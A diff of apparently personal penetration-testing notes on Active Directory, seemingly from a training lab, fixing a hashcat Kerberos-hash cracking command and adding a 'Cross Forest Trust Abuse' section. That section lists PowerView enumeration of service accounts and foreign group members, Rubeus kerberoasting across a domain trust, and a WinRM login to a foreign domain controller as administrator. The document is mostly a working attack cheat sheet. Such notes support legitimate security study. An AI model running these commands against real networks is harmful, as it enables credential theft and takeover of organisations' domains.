@@ -56,7 +56,7 @@ sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_
 
 Cracking kirbi with hashcat
 ```shell-session
-hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.tx
+hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
 ```
 
 Request tickets with powershell
@@ -85,4 +85,33 @@ Get ticket with powerview
 ```Import-Module .\PowerView.ps1```
 ```powershell-session
 Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
+```
+
+
+#### Cross Forest Trust Abuse
+
+
+(powerview)Enumerating Accounts for Associated SPNs Using Get-DomainUser
+```powershell-session
+Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName
+```
+
+(powerview)Enumerating Account for group partnership
+```powershell-session
+Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof
+```
+
+Kerberoasting with specified domain for TGS hash
+```powershell-session
+.\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap
+```
+
+(powerview)Find accounts not part of local domain
+```powershell-session
+Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
+```
+
+(winrm)Accessing DC of foreign group account
+```powershell-session
+Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
 ```
